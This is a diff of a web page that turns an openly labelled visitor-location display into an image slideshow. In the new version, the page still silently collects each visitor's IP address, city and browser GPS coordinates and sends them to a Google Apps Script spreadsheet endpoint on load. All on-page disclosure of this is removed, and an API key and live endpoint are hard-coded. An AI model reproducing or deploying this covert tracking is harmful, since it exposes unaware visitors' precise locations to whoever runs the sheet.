@@ -1,49 +1,73 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Visitor Logger with ipdata.io & Geolocation</title>
+  <meta charset="UTF-8">
+  <title>Pop-up Images with Visitor Logging</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      margin-top: 100px;
-      background: #f4f4f4;
+      margin: 0;
+      background: #000; /* black background */
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
     }
-    h1 { color: #333; }
-    p { color: #555; }
-    a { color: #0077cc; text-decoration: none; }
-    a:hover { text-decoration: underline; }
+    #image-container img {
+      max-width: 90%;
+      max-height: 90%;
+      border-radius: 12px;
+      opacity: 0;
+      animation: fadeIn 1s forwards;
+      position: absolute;
+    }
+    @keyframes fadeIn {
+      to { opacity: 1; }
+    }
   </style>
 </head>
 <body>
-  <h1>Hello 👋</h1>
-  <div id="location">Checking your location...</div>
-  <div id="exact-location"></div>
+  <div id="image-container"></div>
 
   <script>
-    const IPDATA_KEY = "66ff8183ca16012885e156efee7fa9544853ee96576dc8a38ba406d1";
+    const IPDATA_KEY = "66ff8183ca16012885e156efee7fa9544853ee96576dc8a38b";
     const SHEET_WEBAPP_URL = "https://script.google.com/macros/s/AKfycby7HB928piVdSZL4ovPU4jj4JvOfHCY8kgPPUOXJ9-kRTX3ZL5CMXY0fNiv0MMAJZoGyA/exec";
 
-    async function reportVisitor() {
+    const images = [
+      "https://image.cdn2.seaart.me/2025-10-02/d3f627le878c738v1j1g/5fe35387e61d2c74b2d327f8d0bd4061_high.webp",
+      "https://image.cdn2.seaart.me/2025-10-02/d3ffcqle878c738q77ag/29bf11442e9e970bb8c5ee4aef465a9a_high.webp",
+      "https://image.cdn2.seaart.me/2025-10-02/d3etkgte878c73e1atng/84a08183cb1a6abfc5013aae1319cee5_high.webp",
+      "https://image.cdn2.seaart.me/2025-10-02/d3ethvle878c738le7i0/ae7d0aaaf894e2d3ec52ce6fab2f2b36_high.webp",
+      "https://image.cdn2.seaart.me/2025-10-02/d3etan5e878c73dtp9kg/6b7882548f4f0d43b2d261cd184b7dd5fe6390bd_high.webp",
+      "https://image.cdn2.seaart.me/2025-10-01/d3ek9kle878c73daag30/a2520a70ec02a4f24db7734c8a4ea640_high.webp",
+      "https://image.cdn2.seaart.me/2025-09-30/d3dipu5e878c73eil0ag/7ad3b4771b33eee58d9325c1b789ee29_high.webp",
+      "https://image.cdn2.seaart.me/2025-09-26/d3ba1q5e878c73flnhfg/e159bbbb336804f909ac4daa0ef5105b_high.webp",
+      "https://image.cdn2.seaart.me/2025-09-26/d3au10le878c73fsdu5g/b194632da4997f81dd7218fb24f4cd08495c8c8f_high.webp",
+      "https://image.cdn2.seaart.me/2025-09-23/d390djle878c73859q00/a39992f4e23274d45abb011fb860baaa9b841505_high.webp"
+    ];
+
+    const container = document.getElementById("image-container");
+
+    function showRandomImage() {
+      const img = document.createElement("img");
+      const randomIndex = Math.floor(Math.random() * images.length);
+      img.src = images[randomIndex];
+      container.appendChild(img);
+
+      // Remove previous image after a few seconds
+      setTimeout(() => img.remove(), 5000);
+    }
+
+    // Show an image immediately and then every 5 seconds
+    showRandomImage();
+    setInterval(showRandomImage, 5000);
+
+    async function logVisitor() {
       try {
-        // 1️⃣ Get approximate IP-based location
+        // 1️⃣ IP-based location
         const resp = await fetch(`https://api.ipdata.co?api-key=${IPDATA_KEY}`);
         const data = await resp.json();
 
-        if (data.message) {
-          document.getElementById("location").textContent = `Error from ipdata.io: ${data.message}`;
-          console.warn("ipdata.io error:", data.message);
-          return;
-        }
-
-        // Show approximate location
-        document.getElementById("location").innerHTML = `
-          <p>You are visiting from <strong>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</strong></p>
-          <p>Approx. coordinates: ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</p>
-        `;
-
-        // Log IP-based info to Google Sheet
         const paramsIP = new URLSearchParams({
           ip: data.ip || '',
           city: data.city || '',
@@ -56,20 +80,12 @@
         });
         fetch(`${SHEET_WEBAPP_URL}?${paramsIP.toString()}`, { method: 'GET' });
 
-        // 2️⃣ Try browser geolocation for exact coordinates
+        // 2️⃣ Browser GPS (if visitor allows)
         if (navigator.geolocation) {
           navigator.geolocation.getCurrentPosition(
-            position => {
-              const lat = position.coords.latitude;
-              const lon = position.coords.longitude;
-
-              const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-              document.getElementById("exact-location").innerHTML = `
-                <p>Exact coordinates: ${lat.toFixed(6)}, ${lon.toFixed(6)}</p>
-                <p><a href="${mapsLink}" target="_blank">View on Google Maps</a></p>
-              `;
-
-              // Log exact coordinates to Google Sheet
+            pos => {
+              const lat = pos.coords.latitude;
+              const lon = pos.coords.longitude;
               const paramsGeo = new URLSearchParams({
                 ip: data.ip || '',
                 city: data.city || '',
@@ -81,24 +97,18 @@
                 raw: ''
               });
               fetch(`${SHEET_WEBAPP_URL}?${paramsGeo.toString()}`, { method: 'GET' });
-
             },
-            error => {
-              console.warn("Geolocation error:", error.message);
-              document.getElementById("exact-location").textContent = "Exact location unavailable (permission denied or unsupported).";
+            err => {
+              console.warn("GPS denied or unavailable:", err.message);
             }
           );
-        } else {
-          document.getElementById("exact-location").textContent = "Geolocation not supported by your browser.";
         }
-
       } catch (err) {
-        console.error("Error fetching IP data:", err);
-        document.getElementById("location").textContent = "Could not fetch location.";
+        console.error("Error logging visitor:", err);
       }
     }
 
-    document.addEventListener('DOMContentLoaded', reportVisitor);
+    document.addEventListener('DOMContentLoaded', logVisitor);
   </script>
 </body>
 </html>
